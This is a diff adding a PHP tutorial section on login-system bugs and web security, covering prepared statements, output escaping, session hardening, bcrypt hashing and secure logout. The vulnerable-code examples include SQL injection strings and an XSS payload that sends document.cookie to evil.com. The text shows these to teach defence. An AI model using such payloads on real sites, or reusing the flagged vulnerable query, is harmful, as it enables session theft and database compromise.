+> **⚠️ Key lesson from bugs:** The logout `session_set_cookie_params()` **must match** the one used in `config_session.inc.php`. If they differ, `session_start()` creates a **new** empty session instead of resuming the existing one.
+
+---
+
+### 21.9 Common Bugs & Lessons
+
+| Bug | Cause | Fix | Lesson |
+|:---|:---|:---|:---|
+| Login form not disappearing after login | `$_SESSION["user_Id"]` (capital I) vs `$_SESSION["user_id"]` (lowercase) | Fix the case | PHP array keys are **case-sensitive** |
+| Logout button not working | `logout.inc.php` missing `session_set_cookie_params()` | Add matching params before `session_start()` | Cookie params must match creation params |
+| "Undefined array key" warning | Accessing `$_SESSION["user_id"]` for guest users | Check with `isset()` first | Always guard session access with `isset()` |
+| `Session ID cannot be changed when active` | Calling `session_id()` after `session_regenerate_id()` | Remove extra `session_id()` call | Use `session_regenerate_id()` instead of manually setting IDs |
+| Stray `?>` rendering on page | Extra `?>` outside PHP tags in mixed HTML/PHP | Remove stray tag | Be careful with PHP tag boundaries |
+
+---
+
+### 21.10 Error Display Pattern (Reused in Signup & Login)
+
+Both signup and login follow the **same flash message pattern**:
+
+```
+1. Handler detects errors → stores in $_SESSION["errors_xxx"]
+2. Redirects to index.php (POST-Redirect-GET pattern)
+3. View function checks isset($_SESSION["errors_xxx"])
+4. Loops through errors → echoes as <p> tags
+5. unset() clears them so they don't show on next refresh
+```
+
+> **Why sessions for errors?** Sessions can store arrays (multiple errors). URL params are visible and manipulable. `unset()` makes errors one-time flash messages.
+
+---
+
+### 21.11 Security Concepts Covered
+
+| Concept                         | Implementation                                              |
+| ------------------------------- | ----------------------------------------------------------- |
+| **SQL Injection Prevention**    | Prepared statements with `bindParam()`                      |
+| **Password Hashing**            | `password_hash()` + `password_verify()` with bcrypt cost 12 |
+| **Session Fixation Prevention** | `session_regenerate_id(true)` every 30 minutes              |
+| **Session Cookie Security**     | `httponly`, `secure`, `use_only_cookies`, `use_strict_mode`  |
+| **XSS Prevention**              | `htmlspecialchars()` on output + `httponly` cookies          |
+| **Input Validation**            | `filter_var()` for email, `empty()` for required fields     |
+
+---
+
+## 22. 🛡️ PHP Security — Complete Guide
+
+This section consolidates **every security concept** introduced throughout this tutorial into one place. Security isn't a single feature — it's a mindset applied at every layer of your application.
+
+---
+
+### 22.1 SQL Injection
+
+#### What Is It?
+
+SQL injection happens when user input is placed **directly** into an SQL query. An attacker types malicious SQL into a form field, and your code executes it as part of the query — giving them full control over your database.
+
+#### Why Is It Dangerous?
+
+- An attacker can **read** all data (passwords, emails, private info)
+- They can **delete** entire tables (`DROP TABLE users`)
+- They can **bypass** login forms
+- They can **modify** data (change passwords, grant admin access)
+
+#### Example — Vulnerable Code
+
+```php
+<?php
+// 🚨 NEVER DO THIS — user input goes directly into the query
+$username = $_POST["username"];
+$query = "SELECT * FROM users WHERE username = '$username'";
+$pdo->query($query);
+
+// If a hacker types:  ' OR '1'='1
+// The query becomes:
+// SELECT * FROM users WHERE username = '' OR '1'='1'
+// This returns ALL users — login bypassed!
+
+// Even worse, they could type:  '; DROP TABLE users; --
+// The query becomes:
+// SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
+// This DELETES your entire users table!
+?>
+```
+
+#### The Fix — Prepared Statements
+
+Prepared statements **separate** the SQL structure from the data. User input is never treated as SQL code — it's always treated as a plain string value.
+
+```php
+<?php
+// ✅ SAFE — Positional parameters
+$query = "SELECT * FROM users WHERE username = ?;";
+$stmt = $pdo->prepare($query);
+$stmt->execute([$username]);
+// Even if $username = "'; DROP TABLE users; --"
+// MySQL treats the ENTIRE string as a literal username, not as SQL
+
+// ✅ SAFE — Named parameters (more readable)
+$query = "SELECT * FROM users WHERE username = :username;";
+$stmt = $pdo->prepare($query);
+$stmt->bindParam(":username", $username);
+$stmt->execute();
+?>
+```
+
+#### How Prepared Statements Work (Under the Hood)
+
+```
+Without prepared statements:
+  PHP builds: "SELECT * FROM users WHERE username = 'hacker_input'"
+  MySQL sees: One combined string → executes ALL of it as SQL
+
+With prepared statements:
+  Step 1: PHP sends:  "SELECT * FROM users WHERE username = ?"  → MySQL compiles the STRUCTURE
+  Step 2: PHP sends:  "hacker_input"                           → MySQL plugs it in as DATA only
+  MySQL NEVER treats the user input as SQL code
+```
+
+| Method | Syntax | When to Use |
+|:---|:---|:---|
+| Positional `?` | `execute([$val1, $val2])` | Simple queries with few params |
+| Named `:param` | `bindParam(":param", $var)` | Complex queries, better readability |
+
+> **Rule:** If your query uses **any** variable that came from user input, **you must use a prepared statement**. No exceptions.
+
+---
+
+### 22.2 Cross-Site Scripting (XSS)
+
+#### What Is It?
+
+XSS happens when user-submitted data is displayed in the browser **without sanitization**. An attacker submits HTML or JavaScript through a form, and when that data is later shown to other users, the browser executes it.
+
+#### Why Is It Dangerous?
+
+- Attackers can **steal session cookies** and hijack user accounts
+- They can **redirect** users to phishing sites
+- They can **modify** what the page displays (fake login forms)
+- They can **execute** any JavaScript in the victim's browser
+
+#### Example — Vulnerable Code
+
+```php
+<?php
+// 🚨 DANGEROUS — raw user data displayed in HTML
+$username = $_POST["username"];  // User submitted: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+
+echo "<h1>Welcome, " . $username . "</h1>";
+// The browser renders the <script> tag and EXECUTES the JavaScript!
+// The user's session cookie is sent to the attacker's server
+?>
+```
+
+#### The Fix — `htmlspecialchars()`
+
+```php
+<?php
+// ✅ SAFE — HTML characters are escaped before display
+echo "<h1>Welcome, " . htmlspecialchars($username) . "</h1>";
+
+// If $username = "<script>alert('hacked')</script>"
+// Output: <h1>Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;</h1>
+// Browser displays the text literally instead of executing it
+?>
+```
+
+#### What `htmlspecialchars()` Converts
+
+| Character | Converted To | Why |
+|:---|:---|:---|
+| `<` | `&lt;` | Prevents opening HTML tags |
+| `>` | `&gt;` | Prevents closing HTML tags |
+| `&` | `&amp;` | Prevents HTML entities |
+| `"` | `&quot;` | Prevents breaking out of attributes |
+| `'` | `&#039;` | Prevents breaking out of single-quoted attributes |
+
+#### When to Use It
+
+| Situation | Use `htmlspecialchars()`? | Why |
+|:---|:---|:---|
+| Displaying data in HTML (echo, templates) | **YES — always** | Prevents XSS |
+| Inserting data into the database | **No** | Prepared statements handle DB security |
+| Passing data between PHP variables | **No** | No browser involved |
+
+> **Rule:** `htmlspecialchars()` is for **output** (displaying to browser). Prepared statements are for **input** (sending to database). Don't mix them up.
+
+---
+
+### 22.3 Session Hijacking & Session Fixation
+
+#### What Is Session Hijacking?
+
+An attacker steals a user's **session ID** (from cookies, network sniffing, or XSS) and uses it to impersonate them — accessing their account without knowing the password.
+
+#### What Is Session Fixation?
+
+An attacker sets a **known session ID** (e.g., via a crafted URL) and tricks the victim into using it. Once the victim logs in, the attacker uses the same session ID to access their account.
+
+#### Why Is It Dangerous?
+
+- Full account takeover without needing the password
+- Attacker appears as the legitimate user to the server
+- Can be used to steal data, make purchases, change settings
+
+#### The Fixes
+
+**1. Use cookies only for session IDs (no URL-based sessions):**
+
+```php
+<?php
+ini_set('session.use_only_cookies', 1);
+// Blocks session IDs from being passed in URLs like:
+// http://example.com/page.php?PHPSESSID=stolen123
+?>
+```
+
+**2. Reject uninitialized session IDs:**
+
+```php
+<?php
+ini_set('session.use_strict_mode', 1);
+// If someone sends a made-up session ID, PHP generates a NEW one
+// instead of accepting the fake one
+?>
+```
+
+**3. Secure session cookies:**
+
+```php
+<?php
+session_set_cookie_params([
+    'lifetime' => 1800,       // Expires after 30 minutes
+    'domain'   => 'localhost',
+    'path'     => '/',
+    'secure'   => true,       // Only sent over HTTPS
+    'httponly'  => true       // JavaScript CANNOT read this cookie
+]);
+?>
+```
+
+| Parameter | Security Benefit |
+|:---|:---|
+| `secure => true` | Cookie only sent over HTTPS — prevents network sniffing |
+| `httponly => true` | JavaScript can't access `document.cookie` — prevents XSS cookie theft |
+| `lifetime => 1800` | Auto-expires after 30 min — limits the window for attacks |
+
+**4. Regenerate session ID periodically:**
+
+```php
+<?php
+session_regenerate_id(true);
+// Generates a new session ID and DELETES the old session file
+// Even if an attacker got the old ID, it's now invalid
+?>
+```
+
+Best practice — regenerate every 30 minutes:
+
+```php
+<?php
+if (!isset($_SESSION['last_regeneration'])) {
+    session_regenerate_id(true);
+    $_SESSION['last_regeneration'] = time();
+} else {
+    $interval = 60 * 30;  // 30 minutes
+    if (time() - $_SESSION['last_regeneration'] >= $interval) {
+        session_regenerate_id(true);
+        $_SESSION['last_regeneration'] = time();
+    }
+}
+?>
+```
+
+> **Best Practice:** Also regenerate immediately **after login** to prevent fixation attacks.
+
+---
+
+### 22.4 Password Security
+
+#### Why Not Store Plaintext Passwords?
+
+If your database is breached and passwords are stored in plain text, every user's password is instantly exposed. Hashing makes passwords unreadable — even if leaked, they can't be reversed.
+
+#### The Fix — `password_hash()` + `password_verify()`
+
+**Signup (storing the password):**
+
+```php
+<?php
+$plainPassword = "UserPassword123";
+
+$options = ['cost' => 12];  // 2^12 = 4096 iterations
+$hashedPwd = password_hash($plainPassword, PASSWORD_BCRYPT, $options);
+
+// $hashedPwd = "$2y$12$randomSaltAndHash..." (60 chars)
+// Store this in the database, NEVER the plain password
+?>
+```
+
+**Login (checking the password):**
+
+```php
+<?php
+$loginPassword = "UserPassword123";   // What the user typed
+$storedHash = "$2y$12$...";            // Retrieved from database
+
+if (password_verify($loginPassword, $storedHash)) {
+    echo "Password matches — login successful!";
+} else {
+    echo "Wrong password!";
+}
+// password_verify() extracts the salt and cost from the hash automatically
+// You do NOT hash the login password yourself
+?>
+```
+
+#### Why bcrypt?
+
+| Feature | Benefit |
+|:---|:---|
+| **Automatic salt** | Each hash is unique even for the same password |
+| **Configurable cost** | Controls how slow/secure the hash is (higher = slower = more secure) |
+| **One-way** | Cannot be reversed — you can only verify, not decode |
+| **Built into PHP** | No libraries needed — `password_hash()` + `password_verify()` |
+
+#### Cost Value Guide
+
+| Cost | Iterations | Speed | Use When |
+|:---|:---|:---|:---|
+| 10 | 1,024 | Fast | Development/testing |
+| 12 | 4,096 | Moderate | **Production (recommended)** |
+| 14+ | 16,384+ | Slow | High-security applications |
+
+> **Tip:** Use `PASSWORD_DEFAULT` instead of `PASSWORD_BCRYPT` — it auto-upgrades to the best algorithm when PHP updates. Store `pwd VARCHAR(255)` to accommodate future algorithms.
+
+#### Salt & Pepper (General Hashing)
+
+For non-password hashing (tokens, checksums), you can use `hash()` with a salt and pepper:
+
+```php
+<?php
+$data = "SensitiveData";
+$salt = bin2hex(random_bytes(16));   // Random, stored alongside the hash in DB
+$pepper = "AppSecretString";          // Secret, stored in code or .env file
+
+$hash = hash("sha256", $data . $salt . $pepper);
+?>
+```
+
+| Term | What | Where Stored |
+|:---|:---|:---|
+| **Salt** | Random string, unique per record | Database (next to the hash) |
+| **Pepper** | Application-wide secret | Code or environment variable |
+| **Hash** | One-way encrypted result | Database |
+
+> **For passwords, always use `password_hash()`.** The `hash()` + salt/pepper method is for general-purpose hashing only.
+
+---
+
+### 22.5 Input Validation
+
+#### Why Validate?
+
+Never trust user input. Users can submit empty fields, invalid emails, or malicious data. Validation catches bad data **before** it reaches your database or gets displayed.
+
+#### Validation Functions Used in This Tutorial
+
+**1. Check for empty fields:**
+
+```php
+<?php
+function is_input_empty(string $username, string $pwd, string $email) {
+    return empty($username) || empty($pwd) || empty($email);
+}
+// empty() returns true for: "", 0, null, false, [], "0"
+?>
+```
+
+**2. Validate email format:**
+
+```php
+<?php
+function is_email_invalid(string $email) {
+    return !filter_var($email, FILTER_VALIDATE_EMAIL);
+}
+// filter_var() checks if the email has a valid format (user@domain.com)
+// Returns the email if valid, false if invalid
+?>
+```
+
+**3. Check for duplicates (username/email already taken):**
+
+```php
+<?php
+function is_username_taken(object $pdo, string $username) {
+    return (bool) get_username($pdo, $username);  // Calls Model to query DB
+}
+// Prevents two users from registering with the same username
+?>
+```
+
+#### Validation Summary
+
+| Check | Function | Prevents |
+|:---|:---|:---|
+| Empty fields | `empty()` | Blank form submissions |
+| Invalid email | `filter_var($email, FILTER_VALIDATE_EMAIL)` | Fake/malformed emails |
+| Duplicate username | Query DB + check result | Two accounts with same name |
+| Duplicate email | Query DB + check result | Two accounts with same email |
+
+---
+
+### 22.6 Error Handling with `try/catch`
+
+#### Why?
+
+Without error handling, a database failure crashes your page with ugly PHP errors that reveal sensitive information (database name, file paths, query structure). `try/catch` lets you handle errors gracefully.
+
+```php
+<?php
+try {
+    $pdo = new PDO($dsn, $dbusername, $dbpassword);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    // ERRMODE_EXCEPTION makes PDO throw exceptions on errors
+    // Without this, PDO silently returns false and you'd never know the query failed
+} catch (PDOException $e) {
+    // Development: show the error
+    die("Connection failed: " . $e->getMessage());
+
+    // Production: log it and show a generic message
+    // error_log("DB Error: " . $e->getMessage());
+    // die("Something went wrong. Please try again later.");
+}
+?>
+```
+
+| PDO Error Mode | Behavior | Use |
+|:---|:---|:---|
+| `ERRMODE_SILENT` | Silently fails — you must check manually | Never |
+| `ERRMODE_WARNING` | PHP warning, script continues | Rarely |
+| `ERRMODE_EXCEPTION` | Throws catchable exception | **Always** |
+
+> **Production Rule:** Never show database error details to users. Log them to a file and show a friendly message.
+
+---
+
+### 22.7 File Organization for Security
+
+#### The `includes/` Pattern
+
+```
+project/
+├── index.php              ← Public pages (users visit these)
+├── login.php
+└── includes/              ← Private files (never visited directly)
+    ├── dbh.inc.php        ← Database connection
+    ├── config_session.inc.php ← Session security config
+    ├── signup.inc.php     ← Form handler
+    ├── signup_contr.inc.php ← Validation logic
+    └── signup_model.inc.php ← Database queries
+```
+
+| Convention | Meaning |
+|:---|:---|
+| `.inc.php` suffix | Signals "this file is meant to be included, not visited directly" |
+| `includes/` folder | Keeps utility files separate from public pages |
+| `require_once` | Includes the file exactly once; fatal error if missing |
+
+#### Block Direct Access
+
+```apache
+# includes/.htaccess — prevents browser access to include files
+Deny from all
+```
+
+> Without this, someone could visit `yoursite.com/includes/dbh.inc.php` and potentially see error messages that reveal your database credentials.
+
+---
+
+### 22.8 Secure Logout (Proper Session Destruction)
+
+#### Why Just `session_destroy()` Isn't Enough
+
+`session_destroy()` only destroys the session on the **server**. The session **cookie** still exists in the user's browser. If an attacker has the cookie, they could still use it.
+
+#### The Complete Logout Pattern
+
+```php
+<?php
+// 1. Use the SAME cookie params as when the session was created
+session_set_cookie_params([
+    'lifetime' => 1800,
+    'domain'   => 'localhost',
+    'path'     => '/',
+    'secure'   => true,
+    'httponly'  => true
+]);
+
+// 2. Resume the session
+session_start();
+
+// 3. Clear all session data
+session_unset();
+
+// 4. Destroy the session on the server
+session_destroy();
+
+// 5. Delete the cookie from the browser
+setcookie(session_name(), '', time() - 3600, '/', 'localhost', true, true);
+
+// 6. Redirect
+header("Location: ../index.php");
+die();
+?>
+```
+
+| Step | Function | What It Does |
+|:---|:---|:---|
+| 1 | `session_set_cookie_params()` | Must match the params used to CREATE the session |
+| 2 | `session_start()` | Resumes the existing session so we can destroy it |
+| 3 | `session_unset()` | Clears all `$_SESSION` variables |
+| 4 | `session_destroy()` | Deletes the session file on the server |
+| 5 | `setcookie(..., time()-3600)` | Tells the browser to delete the cookie (past expiry date) |
+
+> **Key Lesson:** The logout `session_set_cookie_params()` **must match** the one used in your config. If they differ, `session_start()` creates a NEW empty session instead of resuming the old one — and the old session never gets destroyed.
+
+---
+
+### 22.9 POST-Redirect-GET Pattern (PRG)
+
+#### Why?
+
+If a user submits a form (POST) and you display the result on the same page, refreshing the page **re-submits the form**. This can cause duplicate database entries.
+
+#### How It Works
+
+```
+1. User submits form → POST to handler.php
+2. Handler processes data → INSERT into database
+3. Handler redirects → header("Location: success.php") + die()
+4. Browser loads success.php via GET
+5. Refreshing the page only re-GETs — no duplicate submission
+```
+
+```php
+<?php
+// handler.php — always redirect after processing
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Process data...
+    $stmt->execute([$username, $pwd, $email]);
+
+    // Redirect (switches from POST to GET)
+    header("Location: ../form.php?signup=success");
+    die();  // MUST come after header()
+}
+?>
+```
+
+#### Flash Messages with Sessions
+
+Errors and success messages are passed via `$_SESSION` (not URL params) and cleared after display:
+
+```php
+<?php
+// In handler (after validation fails):
+$_SESSION["errors_signup"] = ["empty_input" => "Please fill in all fields!"];
+header("Location: ../index.php");
+die();
+
+// In view (on the form page):
+if (isset($_SESSION["errors_signup"])) {
+    foreach ($_SESSION["errors_signup"] as $error) {
+        echo "<p>" . $error . "</p>";
+    }
+    unset($_SESSION["errors_signup"]);  // Clear after display — "flash" message
+}
+?>
+```
+
+> **Why sessions for errors?** URL params are visible and manipulable. Sessions store arrays (multiple errors at once) and `unset()` makes them disappear after one display.
+
+---
+
+### 22.10 Type Safety with `declare(strict_types=1)`
+
+#### Why?
+
+PHP normally converts types silently — a string `"5"` passed to a function expecting `int` works without error. This can mask bugs. Strict types force PHP to throw a `TypeError` when types don't match.
+
+```php
+<?php
+declare(strict_types=1);  // Must be the VERY FIRST line of the file
+
+function add(int $a, int $b): int {
+    return $a + $b;
+}
+
+add(5, 3);     // ✅ Works
+add("5", "3"); // ❌ TypeError — strict mode rejects string-to-int coercion
+?>
+```
+
+#### Union Types (PHP 8+)
+
+When a function can legitimately return different types:
+
+```php
+<?php
+// PDO::fetch() returns false (bool) if no row, or an array if found
+function is_username_wrong(bool|array $result) {
+    return !$result;  // false = user not found
+}
+?>
+```
+
+---
+
+### 22.11 Security Checklist
+
+| Threat | Prevention | PHP Tool |
+|:---|:---|:---|
+| **SQL Injection** | Prepared statements with placeholders | `$pdo->prepare()` + `bindParam()` / `execute([])` |
+| **XSS** | Escape output before displaying in HTML | `htmlspecialchars()` |
+| **Session Hijacking** | Secure cookies + periodic ID regeneration | `session_set_cookie_params()` + `session_regenerate_id()` |
+| **Session Fixation** | Reject unknown IDs + regenerate on login | `use_strict_mode` + `session_regenerate_id(true)` |
+| **Password Exposure** | Hash passwords before storing | `password_hash()` + `password_verify()` |
+| **Empty/Invalid Input** | Validate all form data server-side | `empty()` + `filter_var()` |
+| **Direct File Access** | Block access to include files | `.htaccess` + `includes/` folder |
+| **Error Information Leak** | Catch errors, show generic messages | `try/catch` + `error_log()` |
+| **Form Double Submit** | POST-Redirect-GET pattern | `header("Location: ...")` + `die()` |
+| **Type Confusion** | Strict types in functions | `declare(strict_types=1)` |
+
+> **Remember:** Security is not a single step — it's applied at **every layer**: input validation → prepared statements → password hashing → session security → output escaping → error handling.
+
+---
+
 ## 📌 Quick Reference Card
 
 ```
@@ -1916,50 +3582,103 @@ echo "text";           → Print output
 $var = value;          → Variable
 // comment             → Single-line comment
 /* comment */          → Multi-line comment
+
+── Superglobals ──────────────────────
 $_SERVER["KEY"]        → Server info
 $_GET["key"]           → URL query data
 $_POST["key"]          → Form POST data
 $_SESSION["key"]       → Server-side session
 $_COOKIE["key"]        → Browser cookie
-htmlspecialchars($x)   → Sanitize user input
+
+── Output & Sanitization ─────────────
+htmlspecialchars($x)   → Sanitize output for browser
 filter_input(...)      → Sanitize input at source
+filter_var($x, FILTER) → Validate/sanitize data
+
+── Navigation & Flow ─────────────────
 header("Location: x")  → Redirect
-exit()                 → Stop script execution
-var_dump($x)           → Debug — show type + value
-print_r($arr)          → Debug — show array contents
-.                      → String concatenation
-+  -  *  /  %  **      → Arithmetic operators
-==  ===  !=  !==  <>   → Comparison operators
-&&  ||  !              → Logical operators (use these)
-and  or                → Logical operators (lower precedence)
-++$a / $a++            → Increment (pre / post)
---$a / $a--            → Decrement (pre / post)
-if / else if / else    → Conditional branching
-switch ($x) { case: }  → Match one value against many
-match ($x) { val => }  → Strict match expression (PHP 8+)
-is_numeric($x)        → Check if value is a number
-empty($x)              → Check if value is empty/falsy
-count($arr)            → Number of elements in array
-array_push($a, $v)     → Add element to end of array
-array_splice($a,i,n)   → Remove/insert & re-index
-sort() / asort()       → Sort array (drop keys / keep keys)
-strlen() / strpos()    → String length / find position
-str_replace(o,n,str)   → Replace text in string
-strtolower/strtoupper  → Change string case
-substr() / explode()   → Extract / split strings
+exit() / die()         → Stop script execution
+require_once "file"    → Include file (fatal if missing)
+include "file"         → Include file (warning if missing)
+
+── Debugging ─────────────────────────
+var_dump($x)           → Show type + value
+print_r($arr)          → Show array contents
+
+── Strings ───────────────────────────
+.                      → Concatenation
+strlen() / strpos()    → Length / find position
+str_replace(o,n,str)   → Replace text
+strtolower/strtoupper  → Change case
+substr() / explode()   → Extract / split
+
+── Arithmetic ────────────────────────
++  -  *  /  %  **      → Math operators
 abs() / round() / sqrt → Math functions
 rand($min, $max)       → Random number
-date("Y-m-d")          → Current date formatted
-time() / strtotime()   → Unix timestamp / parse date
+
+── Comparison ────────────────────────
+==  ===  !=  !==  <>   → Comparison operators
+&&  ||  !              → Logical operators (use these)
+and  or                → Logical (lower precedence)
+
+── Increment / Decrement ─────────────
+++$a / $a++            → Increment (pre / post)
+--$a / $a--            → Decrement (pre / post)
+
+── Control Flow ──────────────────────
+if / else if / else    → Conditional branching
+switch ($x) { case: }  → Match value against many
+match ($x) { val => }  → Strict match (PHP 8+)
+
+── Loops ─────────────────────────────
+for ($i=0; $i<n; $i++) → Count-based loop
+while (cond) { }       → Condition-based loop
+do { } while (cond)    → Runs at least once
+foreach ($a as $v)     → Iterate array elements
+
+── Arrays ────────────────────────────
+count($arr)            → Number of elements
+array_push($a, $v)     → Add to end
+array_splice($a,i,n)   → Remove/insert & re-index
+sort() / asort()       → Sort (drop keys / keep keys)
+
+── Functions ─────────────────────────
 function name() {}     → Define a function
 return $value;         → Return from function
 declare(strict_types=1)→ Enforce type safety
+
+── Scope ─────────────────────────────
 global $var            → Access global inside function
 static $var            → Persist value between calls
 define("NAME", val)    → Define a constant
 const NAME = val       → Define constant (compile-time)
+
+── Date & Time ───────────────────────
+date("Y-m-d")          → Current date formatted
+time() / strtotime()   → Unix timestamp / parse date
+
+── Sessions ──────────────────────────
+session_start()        → Start/resume session
+session_unset()        → Clear all session variables
+session_destroy()      → Destroy session (next page)
+session_regenerate_id()→ New session ID (security)
+session_set_cookie_params([...]) → Secure cookie config
+
+── Password Hashing ──────────────────
+password_hash($pwd, ALGO)     → Hash password (signup)
+password_verify($pwd, $hash)  → Check password (login)
+
+── Database (PDO) ────────────────────
+$pdo = new PDO($dsn, $u, $p) → Connect
+$pdo->prepare($query)         → Prepare statement
+$stmt->bindParam(":x", $var)  → Bind parameter
+$stmt->execute()               → Run query
+$stmt->fetch(PDO::FETCH_ASSOC) → Get one row
+$stmt->fetchAll(PDO::FETCH_ASSOC) → Get all rows
+$pdo = null; $stmt = null      → Close connection
 ```
 
 ---
 
-> **🚀 Keep Learning!** This cheat sheet will grow as you progress through loops, OOP, and database integration. Keep adding notes!
+> **🚀 Keep Learning!** This cheat sheet covers PHP fundamentals through sessions, security, hashing, and a complete login system. Next up: OOP, file uploads, and more!
